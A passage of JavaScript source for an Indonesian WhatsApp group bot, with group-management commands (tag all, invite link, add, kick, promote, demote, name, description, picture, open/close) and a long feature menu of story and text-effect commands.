‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎\n══✪〘 *👥 Tag All* 〙✪══\n`
for (let mem of participants) {
teks += `➲ @${mem.id.split('@')[0]}\n`
}
kirbotz.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break
case prefix+'linkgroup': 
case prefix+'linkgc': {
addCountCmd(`${command.slice(1)}`, sender, _cmd)
if (!m.isGroup) return reply(mess.group)
let response = await kirbotz.groupInviteCode(m.chat)
kirbotz.sendMessage(m.chat, {text:`Link Group ${groupMetadata.subject} : \nhttps://chat.whatsapp.com/${response}l`, contextInfo: {
"mentionedJid": [sender],
"externalAdReply": {
"showAdAttribution": true,
"title": 'Subscribe YT : FαυȥყRêålz', 
"mediaType": 2, 
"thumbnail": ppnyauser,
"previewType": "VIDEO",
"mediaUrl": 'https://www.instagram.com/reel/CYKGjBzIw5m/?utm_source=ig_web_copy_link',
"sourceUrl": 'https://www.instagram.com/reel/CYKGjBzIw5m/?utm_source=ig_web_copy_link'
}}}, { quoted: m, detectLink: true })
}
break
case prefix+'add': {
addCountCmd(`${command.slice(1)}`, sender, _cmd)
if (!m.isGroup) return reply(mess.group)
if (!isAdmins) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await kirbotz.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case prefix+'kick': {
addCountCmd(`${command.slice(1)}`, sender, _cmd)
if (!m.isGroup) return reply(mess.group)
if (!isAdmins) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await kirbotz.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case prefix+'promote': {
addCountCmd(`${command.slice(1)}`, sender, _cmd)
if (!m.isGroup) return reply(mess.group)
if (!isAdmins) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await kirbotz.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case prefix+'demote': {
addCountCmd(`${command.slice(1)}`, sender, _cmd)
if (!m.isGroup) return reply(mess.group)
if (!isAdmins) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await kirbotz.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case prefix+'setnamegroup': 
case prefix+'setnamegrup': 
case prefix+'setnamegc': {
addCountCmd(`${command.slice(1)}`, sender, _cmd)
if (!m.isGroup) return reply(mess.group)
if (!isAdmins) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!text) throw 'Text ?'
await kirbotz.groupUpdateSubject(m.chat, text).then((res) => reply(mess.success)).catch((err) => reply(jsonformat(err)))
}
break
case prefix+'setdescgroup': 
case prefix+'setdescgrup': 
case prefix+'setdescgc': {
addCountCmd(`${command.slice(1)}`, sender, _cmd)
if (!m.isGroup) return reply(mess.group)
if (!isAdmins) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!text) throw 'Text ?'
await kirbotz.groupUpdateDescription(m.chat, text).then((res) => reply(mess.success)).catch((err) => reply(jsonformat(err)))
}
break
case prefix+'setppgroup': 
case prefix+'setppgc': 
case prefix+'setppgrup': {
addCountCmd(`${command.slice(1)}`, sender, _cmd)
if (!m.isGroup) return reply(mess.group)
if (!isAdmins) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!quoted) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
var media = await kirbotz.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `'kids'`) {
var { img } = await generateProfilePicturee(media)
await kirbotz.query({
tag: 'iq',
attrs: {
to: m.chat,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(media)
reply(`Sukses`)
} else {
var memeg = await kirbotz.updateProfilePicture(m.chat, { url: media })
fs.unlinkSync(media)
reply(`Sukses`)
}
}
break
case prefix+'group': 
case prefix+'grup': {
addCountCmd(`${command.slice(1)}`, sender, _cmd)
if (!m.isGroup) return reply(mess.group)
if (!isAdmins) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
if (args[0] === 'close'){
await kirbotz.groupSettingUpdate(m.chat, 'announcement').then((res) => reply(`Sukses Menutup Group`)).catch((err) => reply(jsonformat(err)))
} else if (args[0] === 'open'){
await kirbotz.groupSettingUpdate(m.chat, 'not_announcement').then((res) => reply(`Sukses Membuka Group`)).catch((err) => reply(jsonformat(err)))
} else {
let buttons = [
{ buttonId: '.group open', buttonText: { displayText: 'Open' }, type: 1 },
{ buttonId: '.group close', buttonText: { displayText: 'Close' }, type: 1 }
]
await kirbotz.sendButtonText(m.chat, buttons, `Mode Group`, kirbotz.user.name, m)
}
}
break
case prefix+'menu':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let hitnya = 0
listkirbotz = `*FαυȥყBOTZ Multi-Device*

Hai Kak ${pushname} Saya Fαυȥყ, Ada Yang Bisa Saya Bantu. Silakan Ketik Perintah Di Bawah Ini

Runtime : ${runtime(process.uptime())}
Speed : ${latensi.toFixed(4)} _Detik_
Jam : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')} WIB
Tanggal : ${tanggal(new Date())}

‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎*OTHER FITUR*
 ${hitnya+=1} ✇ dashboard
 ${hitnya+=1} ✇ owner
 ${hitnya+=1} ✇ donasi
 ${hitnya+=1} ✇ readmore
 ${hitnya+=1} ✇ sticker <reply foto>
 ${hitnya+=1} ✇ toimg <reply sticker>
 ${hitnya+=1} ✇ tourl <reply foto>
 ${hitnya+=1} ✇ attp <teks>
 ${hitnya+=1} ✇ lirik <judul>
 ${hitnya+=1} ✇ emoji <😀>
 ${hitnya+=1} ✇ obfus <code javascript>
 ${hitnya+=1} ✇ animesearch naruto>
 ${hitnya+=1} ✇ quotes
 ${hitnya+=1} ✇ quotesanime
 ${hitnya+=1} ✇ bijak
 ${hitnya+=1} ✇ bucin
 ${hitnya+=1} ✇ truth
 ${hitnya+=1} ✇ dare

*CERPEN FITUR*
 ${hitnya+=1} ✇ cerpen_sejarah
 ${hitnya+=1} ✇ cerpen_sedih
 ${hitnya+=1} ✇ cerpen_sastra
 ${hitnya+=1} ✇ cerpen_romantis
 ${hitnya+=1} ✇ cerpen_rohani
 ${hitnya+=1} ✇ cerpen_rindu
 ${hitnya+=1} ✇ cerpen_remaja
 ${hitnya+=1} ✇ cerpen_ramadhan
 ${hitnya+=1} ✇ cerpen_petualangan
 ${hitnya+=1} ✇ cerpen_persahabatan
 ${hitnya+=1} ✇ cerpen_perpisahan
 ${hitnya+=1} ✇ cerpen_perjuangan
 ${hitnya+=1} ✇ cerpen_penyesalan
 ${hitnya+=1} ✇ cerpen_pengorbanan
 ${hitnya+=1} ✇ cerpen_pengalaman
 ${hitnya+=1} ✇ cerpen_pendidikan
 ${hitnya+=1} ✇ cerpen_penantian
 ${hitnya+=1} ✇ cerpen_patahhati
 ${hitnya+=1} ✇ cerpen_olahraga
 ${hitnya+=1} ✇ cerpen_nasionalisme
 ${hitnya+=1} ✇ cerpen_nasihat
 ${hitnya+=1} ✇ cerpen_motivasi
 ${hitnya+=1} ✇ cerpen_misteri
 ${hitnya+=1} ✇ cerpen_mengharukan
 ${hitnya+=1} ✇ cerpen_malaysia
 ${hitnya+=1} ✇ cerpen_liburan
 ${hitnya+=1} ✇ cerpen_kristen
 ${hitnya+=1} ✇ cerpen_korea
 ${hitnya+=1} ✇ cerpen_kisahnyata
 ${hitnya+=1} ✇ cerpen_keluarga
 ${hitnya+=1} ✇ cerpen_kehidupan
 ${hitnya+=1} ✇ cerpen_jepang
 ${hitnya+=1} ✇ cerpen_inspiratif
 ${hitnya+=1} ✇ cerpen_gokil
 ${hitnya+=1} ✇ cerpen_galau
 ${hitnya+=1} ✇ cerpen_cintasejati
 ${hitnya+=1} ✇ cerpen_cintasegitiga
 ${hitnya+=1} ✇ cerpen_cintasedih
 ${hitnya+=1} ✇ cerpen_cintaromantis
 ${hitnya+=1} ✇ cerpen_cintapertama
 ${hitnya+=1} ✇ cerpen_cintaislami
 ${hitnya+=1} ✇ cerpen_cinta
 ${hitnya+=1} ✇ cerpen_budaya
 ${hitnya+=1} ✇ cerpen_bahasasunda
 ${hitnya+=1} ✇ cerpen_bahasajawa
 ${hitnya+=1} ✇ cerpen_bahasainggris
 ${hitnya+=1} ✇ cerpen_bahasadaerah
 ${hitnya+=1} ✇ cerpen_anak

*PHOTO OXY*
 ${hitnya+=1} ✇ shadow <teks>
 ${hitnya+=1} ✇ write <teks>
 ${hitnya+=1} ✇ romantic <teks>
 ${hitnya+=1} ✇ burnpaper <teks>
 ${hitnya+=1} ✇ smoke <teks>
 ${hitnya+=1} ✇ naruto <teks>
 ${hitnya+=1} ✇ love <teks>
 ${hitnya+=1} ✇ undergrass <teks>
 ${hitnya+=1} ✇ doublelove <teks>
 ${hitnya+=1} ✇ coffecup <teks>
 ${hitnya+=1} ✇ underwaterocean <teks>
 ${hitnya+=1} ✇ smokyneon <teks>
 ${hitnya+=1} ✇ starstext <teks>
 ${hitnya+=1} ✇ rainboweffect <teks>
 ${hitnya+=1} ✇ balloontext <teks>
 ${hitnya+=1} ✇ metalliceffect <teks>
 ${hitnya+=1} ✇ embroiderytext <teks>
 ${hitnya+=1} ✇ flamingtext <teks>
 
*TEXT PRO*
 ${hitnya+=1} ✇ candy <teks> 
 ${hitnya+=1} ✇ christmas <teks> 
 ${hitnya+=1} ✇ 3dchristmas <teks> 
 ${hitnya+=1} ✇ sparklechristmas <teks>
 ${hitnya+=1} ✇ deepsea <teks> 
 ${hitnya+=1} ✇ scifi <teks> 
 ${hitnya+=1} ✇ rainbow <teks> 
 ${hitnya+=1} ✇ waterpipe <teks> 
 ${hitnya+=1} ✇ spooky <teks> 
 ${hitnya+=1} ✇ pencil <teks> 
 ${hitnya+=1} ✇ circuit <teks> 
 ${hitnya+=1} ✇ discovery <teks> 
 ${hitnya+=1} ✇ metalic <teks> 
 ${hitnya+=1} ✇ fiction <teks> 
 ${hitnya+=1} ✇ demon <teks> 
 ${hitnya+=1} ✇ transformer <teks> 
 ${hitnya+=1} ✇ berry <teks> 
 ${hitnya+=1} ✇ thunder <teks> 
 ${hitnya+=1} ✇ magma <teks> 
 ${hitnya+=1} ✇ 3dstone <teks> 
 ${hitnya+=1} ✇ neonlight <teks> 
 ${hitnya+=1} ✇ glitch <teks> 
 ${hitnya+=1} ✇ harrypotter <teks> 
 ${hitnya+=1} ✇ brokenglass <teks> 
 ${hitnya+=1} ✇ papercut <teks> 
 ${hitnya+=1} ✇ watercolor <teks> 
 ${hitnya+=1} ✇ multicolor <teks> 
 ${hitnya+=1} ✇ neondevil <teks> 
 ${hitnya+=1} ✇ underwater <teks> 
 ${hitnya+=1} ✇ graffitibike <teks>
 ${hitnya+=1} ✇ snow <teks> 
 ${hitnya+=1} ✇ cloud <teks> 
 ${hitnya+=1} ✇ honey <teks> 
 ${hitnya+=1} ✇ ice <teks> 
 ${hitnya+=1} ✇ fruitjuice <teks> 
 ${hitnya+=1} ✇ biscuit <teks> 
 ${hitnya+=1} ✇ wood <teks> 
 ${hitnya+=1} ✇ chocolate <teks> 
 ${hitnya+=1} ✇ strawberry <teks> 
 ${hitnya+=1} ✇ matrix <teks> 
 ${hitnya+=1} ✇ blood <teks> 
 ${hitnya+=1} ✇ dropwater <teks> 
 ${hitnya+=1} ✇ toxic <teks> 
 ${hitnya+=1} ✇ lava <teks> 
 ${hitnya+=1} ✇ rock <teks> 
